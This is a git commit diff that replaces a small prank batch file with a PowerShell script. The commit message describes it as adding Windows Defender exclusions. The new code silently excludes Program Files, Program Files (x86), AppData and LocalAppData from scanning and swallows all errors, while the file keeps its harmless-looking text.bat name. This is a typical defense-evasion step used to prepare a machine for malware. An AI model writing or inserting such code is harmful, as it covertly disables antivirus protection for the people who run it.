c1d26b0ee647e21e1b49419d781616c1826926b7
ken2puki <ken2pukii@gmail.com>
2026-09-25 22:57:29 +0300

    Convert batch script to PowerShell for exclusions
    Replaced batch script with PowerShell script to add exclusions to Windows Defender.

--- text.bat
+++ text.bat
@@ -1,5 +1,21 @@
-@echo off
-set "FILE=%TEMP%\text.txt"
-echo пися попа > "%FILE%"
-start /wait notepad "%FILE%"
-del "%FILE%"
+# This script adds exclusions to windows defender
+try {
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \(x86\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+        }
+        }
+catch {
+}
